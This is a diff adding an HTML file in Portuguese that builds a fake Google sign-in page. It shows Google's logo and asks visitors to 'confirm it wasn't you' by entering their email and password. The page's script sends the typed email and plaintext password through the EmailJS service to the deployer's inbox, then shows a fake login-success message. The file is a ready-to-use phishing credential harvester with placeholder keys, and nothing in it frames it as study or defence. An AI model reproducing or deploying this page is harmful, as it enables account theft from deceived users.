@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Roboto, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    #login-form {
+      background: #ffffff;
+      width: 100%;
+      max-width: 400px;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+
+    #logo {
+      width: 60px;
+      margin-bottom: 10px;
+    }
+
+    h3 {
+      font-size: 20px;
+      margin-bottom: 30px;
+      font-weight: 500;
+      color: #202124;
+    }
+
+    p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 24px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      border-color: #1a73e8;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    button:hover {
+      background-color: #1669c1;
+    }
+
+    #success-message {
+      display: none;
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      padding: 20px;
+      border-radius: 12px;
+      max-width: 400px;
+      text-align: center;
+      font-weight: 600;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+    }
+
+    @media (max-width: 480px) {
+      .login-card {
+        padding: 30px 20px;
+      }
+
+      h2 {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <form id="login-form">
+    <img id="logo" src="">
+    <h3>Confirme que não foi <br>você abaixo:</h3>
+    <input type="email" id="email" placeholder="Email" required />
+    <input type="password" id="password" placeholder="Senha" required />
+    <button type="submit">Login</button>
+  </form>
+
+  <div id="success-message">
+    Login realizado com sucesso!
+  </div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+  emailjs.init("Sua Public Key"); 
+
+  const form = document.getElementById("login-form");
+  const successMessage = document.getElementById("success-message");
+  const logoUrl = `https://logo.clearbit.com/google.com`;
+    
+  document.getElementById('logo').src = logoUrl;
+
+  document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    const templateParams = {
+      email: email,
+      password: password,
+    };
+
+    emailjs.send('Sua Service ID', 'Seu Template ID', templateParams)
+      .then((response) => {
+        console.log('Email enviado com sucesso!', response.status, response.text);
+
+        form.style.display = "none";
+        successMessage.style.display = "block";
+      })
+      .catch((err) => {
+        console.error('Erro ao enviar e-mail:', err);
+      });
+  });
+</script>
+</body>
+</html>
